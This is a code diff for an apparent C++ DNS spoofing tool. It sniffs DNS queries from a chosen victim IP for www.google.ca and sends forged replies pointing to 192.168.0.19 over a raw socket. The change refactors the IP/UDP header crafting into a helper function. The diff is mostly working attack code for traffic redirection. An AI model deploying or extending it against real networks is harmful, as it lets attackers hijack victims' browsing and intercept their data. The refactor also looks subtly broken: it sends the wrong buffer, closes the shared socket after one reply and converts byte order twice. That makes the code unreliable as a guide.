@@ -12,13 +12,17 @@
 #include "checksum.h"
 #include "dns.h"
 
+void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const struct in_addr &dst,
+                     const unsigned short sport, const unsigned short dport,
+                     const unsigned char *payload, const int payloadSize);
 void dnsSpoof(NetworkEngine *net);
 void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
                   const unsigned char *packet);
 
-struct in_addr victimIp;                                  // get this from config file
-struct in_addr gatewayIp;                                 // get this from config file
+struct in_addr victimIp;  // get this from config file
+struct in_addr gatewayIp; // get this from config file
 
+int rawSocket;
 
 // get the interface name, ip of gateway and ip of victim
 // main program we need: interface name, ip of gateway, ip of victim
@@ -106,6 +110,7 @@ int main(int argc, const char *argv[]) {
 
     // start dns sniffing
     std::cout << "starting dns sniff" << std::endl;
+    rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     std::thread dnsThread(dnsSpoof, &ipEngine);
     std::cout << "dns sniffing started" << std::endl;
 
@@ -121,6 +126,37 @@ int main(int argc, const char *argv[]) {
 
     dnsThread.join();
     return 0;
+}
+
+void fillIpUdpHeader(unsigned char *buffer, const struct in_addr &src, const struct in_addr &dst,
+                     const unsigned short sport, const unsigned short dport,
+                     const unsigned char *payload, const int payloadSize) {
+    struct iphdr *ipBuffer = (struct iphdr *)buffer;
+    struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
+    ipBuffer->ihl = 5;
+    ipBuffer->version = 4;
+    ipBuffer->tos = 0;
+    ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
+    ipBuffer->frag_off = 0;
+    ipBuffer->ttl = 64;
+    ipBuffer->protocol = IPPROTO_UDP;
+    ipBuffer->check = 0;
+    ipBuffer->saddr = htonl(src.s_addr);
+    ipBuffer->daddr = htonl(dst.s_addr);
+    ipBuffer->check = in_cksum((unsigned short *)ipBuffer, 20);
+    udpBuffer->source = htons(sport);
+    udpBuffer->dest = htons(dport);
+    udpBuffer->len = htons(8 + payloadSize);
+    struct UdpPseudoHeader pseudo_header;
+    pseudo_header.srcAddr = ipBuffer->saddr;
+    pseudo_header.dstAddr = ipBuffer->daddr;
+    pseudo_header.placeholder = 0;
+    pseudo_header.protocol = IPPROTO_UDP;
+    pseudo_header.udpLen = htons(udpBuffer->len);
+    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8);
+    short totalLen = 20 + 8 + payloadSize;
+    ipBuffer->tot_len = htons(totalLen);
+    memcpy(buffer + 20 + 8, payload, payloadSize);
 }
 
 void dnsSpoof(NetworkEngine *net) {
@@ -173,9 +209,11 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     struct in_addr spoofIp;
     spoofIp.s_addr = 0x1300a8c0;
 
-    unsigned char addressFilter[] = {0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x02, 0x63, 0x61, 0x00};
+    unsigned char addressFilter[] = {0x03, 0x77, 0x77, 0x77, 0x06, 0x67, 0x6f, 0x6f,
+                                     0x67, 0x6c, 0x65, 0x02, 0x63, 0x61, 0x00};
 
     unsigned char buffer[1500];
+    unsigned char frame[1500];
     struct iphdr *ip;
     struct udphdr *udp;
     dnshdr *dns;
@@ -192,21 +230,22 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     // get dns header
     dns = (dnshdr *)(packet + 14 + ipLen + UdpStack::UDP_HDR_LEN);
 
-    if (dns->qr == 1) return;
-
-    unsigned char *printIp = (unsigned char *)&victimIp.s_addr;
-    if (ip->saddr != victimIp.s_addr) {
-        std::cout << "from not out victim" << std::endl;
-        printf("packet was from %d.%d.%d.%d\n", printIp[0], printIp[1], printIp[2], printIp[3]);
+    if (dns->qr == 1) {
         return;
     }
 
-    printf("query from %d.%d.%d.%d\n", printIp[0], printIp[1], printIp[2], printIp[3]);
+    std::cout << "got query" << std::endl;
+
+    if (ip->saddr != victimIp.s_addr) {
+        return;
+    }
+
+    std::cout << "query from target host" << std::endl;
 
     unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
     for (int i = 0; addressFilter[i]; i++) {
         if (addressFilter[i] != query[i]) {
-            std::cout << "query mismatch" << std::endl;
+            std::cout << "query not for site we care about" << std::endl;
             return;
         }
     }
@@ -217,41 +256,19 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     std::cout << "craft a response with size: " << responseSize << std::endl;
 
     // reply
-    int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-
-    struct iphdr *ipBuffer = (struct iphdr *)buffer;
-    struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
-
-    ipBuffer->ihl = 5;
-    ipBuffer->version = 4;
-    ipBuffer->tos = 0;
-    ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
-    ipBuffer->frag_off = 0;
-    ipBuffer->ttl = 64;
-    ipBuffer->protocol = IPPROTO_UDP;
-    ipBuffer->check = 0;
-    ipBuffer->saddr = ip->daddr;
-    ipBuffer->daddr = ip->saddr;
-    ipBuffer->check = in_cksum((unsigned short *)ipBuffer, 20);
-    udpBuffer->source = udp->dest;
-    udpBuffer->dest = udp->source;
-    udpBuffer->len = htons(8 + responseSize);
-    struct UdpPseudoHeader pseudo_header;
-    pseudo_header.srcAddr = ipBuffer->saddr;
-    pseudo_header.dstAddr = ipBuffer->daddr;
-    pseudo_header.placeholder = 0;
-    pseudo_header.protocol = IPPROTO_UDP;
-    pseudo_header.udpLen = htons(udpBuffer->len);
-    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8);
-    short totalLen = 20 + 8 + responseSize;
-    ipBuffer->tot_len = htons(totalLen);
+    memset(frame, 0, 1500);
+    struct in_addr ogSrc;
+    struct in_addr ogDst;
+    ogSrc.s_addr = ntohl(ip->saddr);
+    ogDst.s_addr = ntohl(ip->daddr);
+    fillIpUdpHeader(frame, ogDst, ogSrc, ntohs(udp->dest), ntohs(udp->source),
+                    buffer, responseSize);
 
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
-    sin.sin_port = udpBuffer->source;;
-    sin.sin_addr.s_addr = ipBuffer->daddr;
-
-    int bytesSent = sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin, sizeof(sin));
+    sin.sin_port = udp->dest;
+    sin.sin_addr.s_addr = ip->saddr;
+    int bytesSent = sendto(rawSocket, buffer, 20 + 8 + responseSize, 0, (struct sockaddr *)&sin, sizeof(sin));
     std::cout << "sending reply, size: " << bytesSent << std::endl;
 
     close(rawSocket);
